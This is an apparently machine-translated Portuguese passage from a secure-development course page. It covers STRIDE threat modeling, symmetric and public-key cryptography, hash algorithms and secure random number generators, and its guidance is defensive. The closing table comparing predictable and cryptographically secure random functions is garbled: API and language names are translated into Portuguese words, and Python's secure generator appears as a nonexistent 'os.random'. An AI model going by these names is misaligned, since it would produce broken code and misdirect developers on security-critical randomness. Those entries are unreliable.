dados, fluxos de dados e interatores são todos elementos.</p> <p>A ideia é ter um modelo simples do design que mostre os recursos essenciais. Aqui estão algumas regras básicas para uma boa representação:</p> <ul> <li>Cada armazenamento de dados deve ter pelo menos uma entrada e pelo menos uma saída ("nenhum dado surgindo do nada").</li> <li>Somente processos leem ou gravam dados em armazenamentos de dados ("sem psicocinese").</li> <li>Elementos semelhantes em um único limite de confiança podem ser agrupados em um único elemento ("simplificar o modelo").</li> </ul> <p>Em seguida, ao aplicar o STRIDE na etapa 3, você examina cada um dos elementos (processos, armazenamentos de dados, fluxos de dados e interatores) para determinar a quais ameaças ele é suscetível. Para cada elemento, você procura as ameaças conforme mostrado nesta tabela:</p> <p><a class=glightbox data-desc-position=bottom data-height=auto data-type=image data-width=80% href=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/0a9avl1vnydb-image.png><img alt src=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/0a9avl1vnydb-image.png></a></p> <p><strong>Categorias de ameaças STRIDE</strong> , recuperadas do <a href=https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html>SEI</a> , originalmente da Microsoft</p> <p>Observe que <em>STRIDE</em> é simplesmente uma sigla para as ameaças que estão sendo consideradas: falsificação, adulteração, repúdio, divulgação de informações, negação de serviço e elevação de privilégio.</p> <p>STRIDE é uma das formas mais antigas, conhecidas e simples de modelagem de ameaças ( <em><a href=https://web.archive.org/web/20070303103639/http://msdn.microsoft.com/msdnmag/issues/06/11/ThreatModeling/default.aspx>Threat Modeling: Uncover Security Design Flaws Using The STRIDE Approach</a></em> , de Shawn Hernan, Scott Lambert, Tomasz Ostwald e Adam Shostack, 2006).</p> <p>Existem ferramentas que você pode usar e que foram projetadas para dar suporte ao STRIDE; você também pode usar o STRIDE com ferramentas básicas, como uma ferramenta de desenho, um processador de texto e/ou uma planilha.</p> <p>Como observamos anteriormente, existem outras abordagens. Sinta-se à vontade para aprendê-las ou utilizá-las, caso elas ajudem. O Software Engineering Institute (SEI) até mesmo escreveu algumas análises das diversas abordagens, incluindo seus prós e contras ( <a href=https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html>Shevchenko, 2018</a> ). A Microsoft também escreveu material sobre <a href=https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling>modelagem de ameaças</a> .</p> <p>A modelagem de ameaças pode ser um exagero se você não tiver ameaças de segurança significativas, e a modelagem de ameaças não garante que você encontrará todos os problemas.</p> <p>Dito isso, se você tiver ameaças de segurança significativas, a modelagem de ameaças usando abordagens como STRIDE pode fornecer uma maneira relativamente simples de refletir sobre questões-chave antes de investir muito tempo.</p> <h1 id=introducao-a-criptografia>Introdução à Criptografia<a class=headerlink href=#introducao-a-criptografia title="Permanent link">¶</a></h1> <p>A palavra <em>criptografia</em> vem da expressão grega para "escrita secreta".</p> <p>Criptografia é a ciência ou arte de transformar formas inteligíveis, e seu inverso.</p> <p>No entanto, muitas pessoas atacam os sistemas criptográficos; criptoanálise é a ciência ou arte de desfazer uma transformação criptográfica sem o conhecimento exato de como ela foi feita.</p> <p>A criptografia fornece um conjunto de ferramentas que, às vezes, podem ajudar a desenvolver softwares seguros. A criptografia <em>não</em> resolve todos os problemas de segurança. Na verdade, a maioria das vulnerabilidades de segurança de computadores não tem nada a ver com criptografia.</p> <p><a class=glightbox data-desc-position=bottom data-height=auto data-type=image data-width=80% href=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/auj2qgoradd4-image.png><img alt src=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/auj2qgoradd4-image.png></a></p> <p>Dito isso, em <em>alguns</em> sistemas, a criptografia é uma parte vital para garantir a segurança de um sistema.</p> <p>A criptografia é frequentemente usada para proteger a confidencialidade de dados sensíveis e pode fazer isso de duas maneiras: <em>em repouso</em> (armazenando as informações de forma criptografada) e <em>em trânsito</em> (transmitindo as informações de forma criptografada). A criptografia também pode, com certos limites, verificar se as informações são de alguém com uma chave correspondente e/ou verificar se determinados dados não foram alterados.</p> <p>Deixar de usar criptografia quando necessário é, por si só, uma vulnerabilidade de segurança. Informações não criptografadas são frequentemente chamadas de "texto não criptografado" ou "texto simples". Em muitas redes (incluindo a internet e seu subconjunto, a World Wide Web), bem como em muitos sistemas de armazenamento (como backups), o texto simples pode ser interceptado e modificado por terceiros não autorizados.</p> <p>Por exemplo, normalmente queremos que nossos navegadores e servidores tenham uma conexão criptografada entre si, para que as informações sejam confidenciais, não possam ser modificadas sem detecção e para que, pelo menos, o navegador tenha alta confiança de que está se comunicando com o servidor correto. Muitos sistemas gerenciam dados confidenciais, como dados financeiros, dados de saúde e informações de identificação pessoal (PII). A criptografia costuma ser uma parte importante da proteção desses dados, para que não sejam facilmente lidos ou modificados de forma indetectável por terceiros.</p> <p>No entanto, muitas pessoas sabem como atacar sistemas criptográficos. O uso incorreto da criptografia pode, às vezes, levar a uma falsa confiança em um sistema inseguro. Pior ainda, a criptografia usada incorretamente pode ser difícil de detectar para quem não é especialista, então esses erros podem ser explorados por longos períodos.</p> <p>Alguns países possuem diversas leis e regulamentações sobre criptografia, que mudaram ao longo dos anos. Vejamos os EUA como exemplo. A exportação de tecnologia e dispositivos criptográficos dos Estados Unidos foi severamente restringida até 1992. Mais recentemente, os EUA passaram a exigir notificações por e-mail para muitos usos da tecnologia de criptografia. Em 2021, a regra americana foi ainda mais flexibilizada, de modo que projetos de software de código aberto só precisam fornecer uma notificação se utilizarem "criptografia não padrão". Geralmente, você deve usar algoritmos e protocolos criptográficos padrão bem verificados de qualquer maneira; portanto, para muitos projetos de software de código aberto, isso elimina a exigência de notificação ao exportar dos EUA. Consulte o livro " <a href=https://www.linuxfoundation.org/tools/understanding-us-export-controls-with-open-source-projects/ ><em>Compreendendo a Tecnologia de Código Aberto e os Controles de Exportação dos EUA"</em></a> <a href=https://www.linuxfoundation.org/tools/understanding-us-export-controls-with-open-source-projects/ >da Linux Foundation</a> para obter mais informações. Uma discussão sobre regulamentações criptográficas em todo o mundo está além do escopo deste curso.</p> <p><strong>Observação:</strong> Falhas criptográficas estão em segundo lugar no Top 10 da OWASP de 2021. Em 2017, ocuparam o terceiro lugar no Top 10 da OWAS e, posteriormente, foram denominadas <em>Exposição de Dados Sensíveis</em> . A exposição de dados sensíveis nem sempre é causada pelo uso inadequado da criptografia, mas é uma causa subjacente comum. O Top 25 da CWE de 2021, em terceiro lugar, é <em>a Transmissão de Informações Sensíveis em Texto Claro</em> ( <a href=https://cwe.mitre.org/data/definitions/319.html>CWE-319</a> ). <em>A Força Inadequada da Criptografia</em> é uma causa tão comum de vulnerabilidades de segurança que, por si só, está em terceiro lugar no Top 25 da CWE de 2019 (é <a href=https://cwe.mitre.org/data/definitions/326.html>CWE-326</a> ).</p> <p>Para o desenvolvimento normal de software, há três regras principais para criptografia:</p> <ol> <li><strong>Nunca desenvolva seu próprio algoritmo ou protocolo criptográfico.</strong> Criá-los é altamente especializado. Para fazer um bom trabalho, você precisa de um doutorado em criptografia, o que, por sua vez, exige matemática avançada. Em vez disso, descubra o que foi aprovado publicamente por criptógrafos respeitáveis ​​e use isso.</li> <li><strong>Nunca implemente seus algoritmos ou protocolos criptográficos (se tiver uma alternativa).</strong> Há um grande número de regras especializadas para a implementação de algoritmos criptográficos que não se aplicam a softwares comuns e, portanto, não são conhecidas pela maioria dos desenvolvedores de software. Pequenos erros de implementação de algoritmos criptográficos frequentemente se transformam em vulnerabilidades enormes. Em vez disso, reutilize boas implementações sempre que possível.</li> <li><strong>Sistemas criptográficos (como algoritmos e protocolos) ocasionalmente apresentam falhas.</strong> Certifique-se de que os que você escolher ainda sejam fortes o suficiente e esteja preparado para substituí-los.</li> </ol> <p>Ao escolher uma biblioteca criptográfica, prefira aquelas que tenham sido alvo de revisão pública significativa e tenham uma API simples e de uso correto. Caso contrário, você corre o risco de ter uma vulnerabilidade no componente reutilizado ou de ter uma vulnerabilidade causada pelo uso incorreto de uma API.</p> <p>Criptoanalistas estão sempre procurando maneiras de quebrar algoritmos criptográficos, e criptógrafos estão sempre trabalhando para combater esses ataques. Historicamente, algoritmos criptográficos são desenvolvidos, duram um tempo e finalmente são quebrados devido a algum ataque. Portanto, antes de escolher qualquer coisa em criptografia, faça algumas pesquisas para garantir que o que você está escolhendo não seja fraco ou quebrado. Talvez nada tenha sido quebrado recentemente... mas seria imprudente presumir isso.</p> <p>As seções a seguir identificarão alguns algoritmos e protocolos principais, além de algumas dicas sobre eles.</p> <h2 id=algoritmos-de-criptografia-de-chave-compartilhadasimetrica>Algoritmos de criptografia de chave compartilhada/simétrica<a class=headerlink href=#algoritmos-de-criptografia-de-chave-compartilhadasimetrica title="Permanent link">¶</a></h2> <p>Um algoritmo de criptografia <em>de chave simétrica</em> ou <em>chave compartilhada</em> recebe dados (chamados de <strong>texto não criptografado</strong> ) e uma chave como entrada e produz dados criptografados (chamados de <strong>texto cifrado</strong> ).</p> <p>Também pode fazer o inverso: usando o <strong>texto cifrado</strong> e a mesma chave, pode produzir o <strong>texto não criptografado</strong> correspondente .</p> <p>O importante sobre algoritmos de criptografia de chave simétrica é que a <em>mesma</em> chave é usada tanto para criptografar quanto para descriptografar os dados.</p> <p>Portanto, se você deseja que as pessoas consigam descriptografar algum <strong>texto</strong> cifrado criptografado dessa forma, é preciso providenciar para que elas obtenham a chave.</p> <p>A maioria dos algoritmos de chave simétrica modernos são extremamente rápidos (geralmente acelerados por hardware) e formam a base de muitos sistemas criptográficos.</p> <h1 id=escolhendo-um-algoritmo-de-chave-simetrica>Escolhendo um algoritmo de chave simétrica<a class=headerlink href=#escolhendo-um-algoritmo-de-chave-simetrica title="Permanent link">¶</a></h1> <p>No momento da redação deste texto (2020), o algoritmo de chave simétrica mais comum era o <strong>Advanced Encryption Standard (AES)</strong>.</p> <p>O AES suporta três tamanhos de chave: 128, 192 ou 256 bits; os tamanhos de chave maiores são mais resistentes a ataques, mas levam mais tempo para serem executados. No momento da redação deste texto, até mesmo 128 bits são considerados suficientemente seguros para a maioria dos propósitos, mas verifique se algo mudou. O AES é extremamente rápido; foi projetado para ser rápido em processadores modernos, e muitos processadores possuem mecanismos que o tornam ainda mais rápido.</p> <p>Existem outros algoritmos históricos de chave simétrica que são considerados <em>inseguros</em> para casos de uso típicos hoje:</p> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> DES: Seu comprimento de chave de 56 bits é muito curto para ser seguro hoje.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> RC4: Muitas vulnerabilidades foram encontradas no RC4, e ele é geralmente considerado inseguro.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> 3DES: Internamente, possui um tamanho de bloco de apenas 64 bits. Algoritmos com tamanhos de bloco tão pequenos são vulneráveis ​​a um ataque chamado ataque de aniversário se forem usados ​​para criptografar quantidades significativas de dados com a mesma chave.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Blowfish: Este também tem um tamanho de bloco de apenas 64 bits e, portanto, tem os mesmos problemas que o 3DES.</li> </ul> <p>Existem algoritmos alternativos de chave simétrica que também são geralmente considerados seguros. Por exemplo, o TwoFish foi finalista no concurso que levou ao AES e, no momento da redação deste texto, não apresenta vulnerabilidades práticas conhecidas.</p> <h2 id=escolhendo-um-modo>Escolhendo um modo<a class=headerlink href=#escolhendo-um-modo title="Permanent link">¶</a></h2> <p>Muitos algoritmos de chave simétrica, incluindo AES, são chamados de algoritmos <em>de bloco</em> . Com algoritmos de bloco, você também deve escolher um <em>modo</em> a ser usado. Aqui está a regra mais importante sobre modos: O modo ECB é basicamente um modo de depuração ou teste para testar algoritmos criptográficos. No modo ECB, o mesmo bloco de dados produzirá o mesmo resultado de criptografia. Isso é desastroso para um algoritmo de criptografia, pois revela muito sobre os dados que deveriam ser criptografados. Um ótimo exemplo disso é a chamada imagem "ECB Penguin"; esta imagem é criptografada usando um modo ECB. Observe que no ECB Penguin abaixo, a imagem do Tux, o Pinguim, é claramente (e desastrosamente) visível. Uma imagem criptografada deve aparecer como ruído aleatório, como ilustrado pelo GCM Penguin abaixo, uma imagem criptografada que usa o modo Galois/Contador (GCM).</p> <p>Tabela: Linux Penguin: Original vs. ECB vs. GCM</p> <table> <thead> <tr> <th><strong>Original</strong></th> <th><strong>BCE criptografado</strong></th> <th><strong>GCM criptografado</strong></th> </tr> </thead> <tbody> <tr> <td><a class=glightbox data-desc-position=bottom data-height=auto data-type=image data-width=80% href=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/rvfq04225hgc-TheoriginalLinuxPenguinimage.png><img alt="A imagem original do pinguim do Linux" src=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/rvfq04225hgc-TheoriginalLinuxPenguinimage.png></a></td> <td><a class=glightbox data-desc-position=bottom data-height=auto data-type=image data-width=80% href=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/nid5aoxjuwnf-TheECBPenguin-AdarkECB-encryptedimagethatclearlyshowstheLinuxmascotTuxthePenguin.png><img alt="O Pinguim do ECB: Uma imagem escura criptografada pelo ECB que mostra claramente o mascote do Linux, Tux, o Pinguim" src=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/nid5aoxjuwnf-TheECBPenguin-AdarkECB-encryptedimagethatclearlyshowstheLinuxmascotTuxthePenguin.png></a></td> <td><a class=glightbox data-desc-position=bottom data-height=auto data-type=image data-width=80% href=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/caqgz18dhv79-TheGCMPenguin-AnencryptedimagethatusesGaloisCountermodeGCM.png><img alt="O GCM Penguin: Uma imagem criptografada que usa o modo Galois/Counter (GCM)" src=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/caqgz18dhv79-TheGCMPenguin-AnencryptedimagethatusesGaloisCountermodeGCM.png></a></td> </tr> <tr> <td></td> <td></td> <td></td> </tr> </tbody> </table> <p><strong>O ECB Penguin e o GCM Penguin foram gerados por Nikos Mavrogiannopoulos e lançados sob a <a href=https://creativecommons.org/licenses/by/4.0/legalcode>licença CC BY-SA 4.0 International</a> . Foram inspirados no <a href=https://blog.filippo.io/the-ecb-penguin/ >ECB Penguin</a> de Filippo Valsorda e na imagem <a href=https://en.wikipedia.org/wiki/File:Tux_ecb.jpg>original de baixa resolução do ECB Penguin,</a> criada pelo usuário da Wikipédia: <a href=https://en.wikipedia.org/wiki/User:Lunkwill>Lunkwill</a> . A imagem original do pinguim Tux (mascote oficial do Linux) foi criada por Larry Ewing em 1996.</strong></p> <p>**Historicamente, o modo <em>Cipher Block Chaining</em> (CBC) era usado, mas ele precisa ser calculado sequencialmente, o que o torna lento em sistemas multinúcleo. Outro problema é que muitos sistemas que usam CBC são vulneráveis ​​a ataques, a menos que sua integridade seja verificada primeiro. Portanto, em geral, é melhor evitar o modo CBC atualmente ( <a href=https://docs.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode>documentação do Microsoft CBC</a> , 2020).</p> <p>Um modo comum usado hoje em dia é o Modo Galois/Contador (GCM).</p> <p>Ele é rápido, paralelizável e adiciona um código de autenticação para detectar facilmente se a chave errada foi usada.</p> <p>É um bom modo para usar. Existem outros modos bons também; o importante é escolher um modo com sabedoria e, em particular, nunca usar o modo ECB em sistemas de produção.</p> <h2 id=hashes-criptograficos-impressoes-digitais>Hashes Criptográficos (Impressões Digitais)<a class=headerlink href=#hashes-criptograficos-impressoes-digitais title="Permanent link">¶</a></h2> <p>Alguns programas precisam de um algoritmo de hash criptográfico unidirecional, ou seja, uma função que recebe uma quantidade <em>arbitrária</em> de dados e gera um número de comprimento fixo com propriedades especiais.</p> <p>As propriedades especiais são que deve ser inviável para um invasor criar:</p> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Outra mensagem com um determinado valor de hash ( <em>resistência à pré-imagem</em> )</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Outra mensagem (modificada) com o mesmo hash da primeira mensagem ( <em>resistência à segunda pré-imagem</em> )</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Quaisquer duas mensagens com o mesmo hash ( <em>resistência à colisão</em> ).</li> </ul> <p>A ideia é que você possa representar uma quantidade arbitrária de dados com um valor menor de comprimento fixo.</p> <p>Eles são <em>"unidirecionais"</em> no sentido de que geralmente não é possível recriar os dados originais, dado apenas o valor do hash.</p> <p>Hashes criptográficos são úteis por si só e também são frequentemente usados ​​como parte de sistemas criptográficos maiores.</p> <p>Você deve evitar os algoritmos MD4, MD5 e SHA-0, pois eles são conhecidos por serem quebrados.</p> <p>A família SHA-2 (incluindo SHA-256 e SHA-512) e o algoritmo SHA-3 são amplamente utilizados e geralmente considerados seguros no momento da redação deste texto. Houve preocupações com a família SHA-2, o que levou ao desenvolvimento do SHA-3, mas, até o momento da redação deste texto, nenhuma quebra completa do SHA-2 foi relatada publicamente.</p> <p>O algoritmo SHA-1 é um caso um pouco mais complicado. Você não deve usá-lo em novos sistemas e deve abandoná-lo imediatamente se já o utiliza. O NIST descontinuou o SHA-1 em 2011 porque ele está basicamente quebrado, no sentido de que não atende mais à definição de hash criptográfico. Na maioria dos casos, não há problema em migrar do SHA-1 para o SHA-2 ou SHA-3.</p> <p>No entanto, um problema irritante é que a ferramenta git amplamente utilizada (como desenvolvida originalmente) depende fundamentalmente do SHA-1. As falhas atualmente conhecidas no SHA-1 não são relevantes para situações comuns.</p> <p>Além disso, desde 2020, o git utiliza uma variante reforçada do SHA-1 que combate os principais problemas do SHA-1 conforme ele é usado no git. No entanto, os ataques apenas se tornam mais fortes, não mais fracos, o que gera muitas preocupações sobre o uso do SHA-1 no git.</p> <p>No momento em que este texto foi escrito, havia um esforço para atualizar o Git para que ele suportasse um algoritmo de hash criptográfico diferente, especificamente o SHA-256. Isso tem sido complicado porque o Git não foi originalmente projetado para suportar outro algoritmo de hash criptográfico ( <a href=https://lwn.net/Articles/811068/ >A new hash algorithm for Git</a> , por Jonathan Corbet, 2020).</p> <p>Conforme observado em LWN.net, _“um dos motivos pelos quais essa transição tem sido tão difícil é que a implementação original do Git não foi projetada para substituir algoritmos de hash.</p> <p>Grande parte do trabalho para [implementar o SHA-256 no Git] tem sido retroceder nessa falha de projeto inicial [para tornar] o Git fundamentalmente indiferente ao algoritmo de hash utilizado.</p> <p>Este [trabalho] deve tornar o Git mais adaptável no futuro, caso surja a necessidade de substituir o SHA-256 por algo mais forte”_ ( <a href=https://lwn.net/Articles/823352/ >Updating the Git protocol for SHA-256</a> , por John Coggeshall, 2020).</p> <p>Isso pode ser resolvido no git quando você ler isto. No entanto, o ponto principal é aprender com esse erro. Como observado anteriormente, sistemas criptográficos (como algoritmos e protocolos) ocasionalmente apresentam falhas, então você deve estar preparado para substituí-los.</p> <h2 id=criptografia-de-chave-publica-assimetrica>Criptografia de chave pública (assimétrica)<a class=headerlink href=#criptografia-de-chave-publica-assimetrica title="Permanent link">¶</a></h2> <p>Uma chave pública ou sistema criptográfico assimétrico utiliza pares de chaves. Uma chave é <em>privada</em> (conhecida apenas pelo seu proprietário) e a outra é <em>pública</em> (que pode ser distribuída publicamente).</p> <p>As chaves estão relacionadas, mas desempenham papéis diferentes, razão pela qual são frequentemente chamadas de <em>criptografia assimétrica</em> .</p> <p>É vital nesses sistemas manter a chave privada privada.</p> <p>Esses algoritmos podem ser usados ​​de uma ou mais maneiras (dependendo do algoritmo), incluindo:</p> <table> <thead> <tr> <th></th> <th></th> </tr> </thead> <tbody> <tr> <td>Criptografia</td> <td>Qualquer pessoa poderia criptografar uma mensagem usando uma chave pública, mas somente alguém com a chave privada correspondente poderia descriptografá-la. Algoritmos de criptografia de chave pública são geralmente relativamente lentos, portanto, em muitas situações, uma <em>chave</em> para um algoritmo de chave compartilhada é criptografada, e o restante da mensagem é criptografado com uma chave compartilhada.</td> </tr> <tr> <td>Assinaturas digitais (autenticação)</td> <td>Um remetente pode usar um algoritmo de chave pública e sua chave privada para fornecer dados adicionais chamados de <em>assinatura digital</em> ; qualquer pessoa com a chave pública pode verificar se o remetente possui a chave privada correspondente.</td> </tr> <tr> <td>Troca de chaves</td> <td>Existem algoritmos de chave pública que permitem que duas partes acabem com uma chave compartilhada sem que observadores passivos externos consigam determinar a chave.</td> </tr> <tr> <td>Um algoritmo de chave pública amplamente utilizado é o algoritmo RSA, que <em><strong>pode</strong></em> ser usado para todos esses propósitos. No entanto, <em><strong>não implemente o RSA você mesmo</strong></em> . O RSA é fundamentalmente baseado na exponenciação de números grandes, o que leva alguns desenvolvedores a implementá-lo eles mesmos ou a pensar que é simples. Na prática, é extremamente fácil implementar o RSA <em>de forma insegura</em> . Por exemplo, é muito difícil verificar se há parâmetros fracos que <em>parecem</em> aceitáveis, mas tornam a sua violação trivial. Para ser seguro, o RSA <em><strong>deve</strong></em> ser implementado com algo chamado "preenchimento". Existe um esquema de preenchimento RSA padrão com uma prova rigorosa chamada OAEP, mas é difícil de implementar corretamente (implementações incorretas podem ser vulneráveis ​​ao <em>ataque de Manger</em> ). Na prática, o RSA pode ser complicado de aplicar corretamente e, a menos que você entenda de criptografia, não será capaz de dizer quando ele não está funcionando ( <em><a href=https://blog.trailofbits.com/2019/07/08/fuck-rsa/ >Sério, pare de usar RSA</a></em> , 2019).</td> <td></td> </tr> </tbody> </table> <p>Os comprimentos de chave RSA precisam ser maiores do que você imagina. Um comprimento de chave RSA de 1024 bits é aproximadamente equivalente a um comprimento de chave simétrica de 80 bits, que é tão pequeno que geralmente é considerado inseguro. Um comprimento de chave RSA de 2048 bits é equivalente a um comprimento de chave simétrica de 112 bits; um comprimento de 2048 bits é considerado pouco aceitável por alguns (por exemplo, o NIST diz que isso pode ser usado até 2030, após o qual não pode ser usado pelo governo dos EUA). Se você estiver usando RSA, provavelmente deve usar uma chave de pelo menos 3.072 bits nas implantações atuais (isso é equivalente a uma chave simétrica de 128 bits). Você precisaria de uma chave RSA de 15.360 bits para obter o equivalente a uma chave simétrica de 256 bits. Consulte <em><a href=https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf>a Recomendação do NIST para Gerenciamento de Chaves: Parte 1 - Geral</a></em> para obter mais informações sobre comprimentos equivalentes de chaves. Infelizmente, o RSA é relativamente lento, especialmente à medida que você aumenta os comprimentos de chave necessários para segurança mínima. Por todas essas razões, algumas organizações, como a Trail of Bits, recomendam evitar o uso de RSA na maioria dos casos ( <em><a href=https://blog.trailofbits.com/2019/07/08/fuck-rsa/ >Sério, pare de usar RSA</a></em> , 2019).</p> <p>Uma família inteira de algoritmos é chamada de <em>criptografia de curva elíptica</em> ; estes são algoritmos que são baseados em matemática complexa envolvendo curvas elípticas. Estes algoritmos requerem comprimentos de chave muito menores para força criptográfica equivalente, e esta é uma vantagem significativa. Historicamente, a criptografia de curva elíptica envolveu um campo minado de patentes, mas, ao longo dos anos, muitas dessas patentes expiraram e assim a criptografia de curva elíptica se tornou mais comum. Um algoritmo amplamente utilizado e respeitado para troca de chaves é o X25519, enquanto para assinatura digital é o EdDSA; um protocolo relacionado chamado ECIES combina troca de chaves de curva elíptica com um algoritmo de chave simétrica (para mais detalhes, veja <em><a href=https://blog.trailofbits.com/2019/07/08/fuck-rsa/ >Seriously, stop using RSA</a></em> , 2019).</p> <p>O Padrão de Assinatura Digital (DSS) é um padrão NIST (FIPS 186-5) para a criação de assinaturas digitais criptográficas. Ele suporta vários algoritmos subjacentes: o algoritmo de assinatura digital RSA, o algoritmo de assinatura digital de curva elíptica (ECDSA) e o algoritmo de assinatura digital de curva de Edwards (EdDSA).</p> <p>Há também uma variedade de algoritmos de troca de chaves. O mais antigo é o algoritmo de troca de chaves Diffie-Hellman. Existe um algoritmo de troca de chaves mais recente, baseado em curvas elípticas, chamado Elliptic Curve Diffie-Hellman (ECDH).</p> <p>Como mencionado anteriormente, é fundamental que você utilize implementações existentes e respeitadas (não as implemente você mesmo) e verifique cuidadosamente todos os parâmetros escolhidos. Talvez o mais importante seja o comprimento da chave para esse algoritmo (como observado anteriormente, algoritmos de curva elíptica têm força equivalente com chaves mais curtas). Uma fonte útil para comprimentos de chave recomendados é <em><a href=https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf>a Recomendação para Gerenciamento de Chaves do NIST: Parte 1 - Geral</a></em> .</p> <h2 id=gerador-de-numeros-pseudoaleatorios-criptograficamente-seguro-csprng>Gerador de números pseudoaleatórios criptograficamente seguro (CSPRNG)<a class=headerlink href=#gerador-de-numeros-pseudoaleatorios-criptograficamente-seguro-csprng title="Permanent link">¶</a></h2> <p>Muitos algoritmos dependem de valores secretos que não podem ser adivinhados por um invasor, também conhecidos como "criptograficamente seguros". Isso inclui valores usados ​​por algoritmos de criptografia (como chaves privadas e nonces), IDs de sessão e muitos outros valores. Se um invasor conseguir adivinhar um valor, incluindo valores passados ​​ou futuros, muitos sistemas se tornam inseguros.</p> <p>Um desafio é histórico: hoje, o nome " <em>aleatório"</em> em bibliotecas de linguagens de programação geralmente implica que a função <em>não</em> é criptograficamente segura. Um dos primeiros usos dos computadores digitais foi implementar simulações (especialmente <em>simulações de Monte Carlo</em> ), nas quais números aleatórios eram adquiridos repetidamente para uma simulação. Muitas vezes, era importante conseguir <em>reconstruir</em> esses números aleatórios para que os experimentos pudessem ser repetidos. Internamente, essas funções aleatórias seriam implementadas usando algoritmos como um gerador congruencial linear (GCL) e frequentemente seriam <em>semeadas</em> (inicializadas) por valores como data/hora, que podem ser facilmente adivinhados por um invasor. Como esse foi um dos primeiros usos dos computadores, existe uma convenção em quase todas as linguagens de programação de que a palavra " <em>aleatório</em> " se refere a uma maneira de criar uma sequência de números que pode ser facilmente reconstruída posteriormente, se necessário. Em outras palavras, a palavra "aleatório" em linguagens de programação normalmente implica em " <em>aleatório previsivelmente"</em> , e isso não é o que se deseja em criptografia ou segurança. Esses números aleatórios <em><strong>não</strong></em> <em><strong>devem</strong></em> ser usados ​​em mecanismos de segurança onde é importante que um invasor <em><strong>não</strong></em> consiga determinar o número.</p> <p><a class=glightbox data-desc-position=bottom data-height=auto data-type=image data-width=80% href=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/foi5uvdadvrf-random_number.png><img alt="Número aleatório de xkcd.com" src=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/foi5uvdadvrf-random_number.png></a></p> <p><strong>Número aleatório</strong> , recuperado de <a href=https://xkcd.com/221>xkcd.com</a> , licenciado sob <a href=https://creativecommons.org/licenses/by-nc/2.5/ >CC-BY-NC-2.5</a></p> <p>Em vez disso, para tarefas relacionadas à criptografia e segurança, você precisa usar um <a href=https://en.wikipedia.org/wiki/Cryptographically-secure_pseudorandom_number_generator>gerador de números pseudoaleatórios criptograficamente seguro (CSPRNG)</a> . Em outras palavras, existem muitos algoritmos e implementações de geradores de números pseudoaleatórios (PRNG), mas, por questões de segurança, você deve usar <em>apenas</em> PRNGs que sejam PRNGs criptograficamente seguros (CSPRNGs). CSPRNGs também são chamados de PRNGs criptográficos (CPRNGs). Um bom CSPRNG impede a previsão prática da próxima saída, considerando saídas anteriores (com probabilidade maior que a aleatória), e também impede a revelação de saídas anteriores se seu estado interno for comprometido. Normalmente, o nome de uma implementação de CSPRNG terá "seguro" e/ou "cripto". Na documentação, você pode ver referências a algoritmos CSPRNG bem aceitos, como Yarrow, Fortuna, ANSI X9.17 (que pode usar qualquer cifra de bloco), Hash_DRBG, HMAC_DRBG e CTR_DRBG do NIST SP 800-90A.</p> <p>Aqui estão alguns exemplos de como chamar o PRNG previsível versus um PRNG criptograficamente seguro em diferentes linguagens de programação (na prática, geralmente há várias maneiras; o objetivo é mostrar que elas são diferentes):</p> <p>Tabela: PRNG previsível versus PRNG criptograficamente seguro em diferentes linguagens de programação</p> <table> <thead> <tr> <th>Linguagem</th> <th>Valor aleatório previsível <br>(não usar por segurança)</th> <th>Valor aleatório criptograficamente seguro</th> </tr> </thead> <tbody> <tr> <td><strong>Java</strong></td> <td><strong>Aleatório()</strong></td> <td><strong>SecureRandom()</strong></td> </tr> <tr> <td><strong>C#</strong></td> <td><strong>Sistema.Aleatório</strong></td> <td><strong>Sistema.Segurança.Criptografia.Gerador de Números Aleatórios</strong></td> </tr> <tr> <td><strong>JavaScript</strong></td> <td><strong>Matemática aleatória</strong></td> <td><strong>window.crypto.getRandomValues</strong> ​​ou <strong>crypto.randomBytes</strong></td> </tr> <tr> <td><strong>Pitão</strong></td> <td><strong>aleatório</strong></td> <td><strong>os.random</strong></td> </tr> <tr> <td><strong>Rubi</strong></td> <td><strong>rand</strong> (ou <strong>Random.rand</strong> )</td> <td><strong>SecureRandom.rand</strong></td> </tr> <tr> <td>Outro desafio é que o software é fundamentalmente determinístico; dadas exatamente as mesmas entradas, um algoritmo sequencial deve produzir exatamente a mesma saída. Normalmente, você não deve semear (inicializar) diretamente nenhum algoritmo criptograficamente seguro, pois muitas dessas bibliotecas implementam a semeadura segura elas mesmas.</td> <td></td> <td></td> </tr> </tbody> 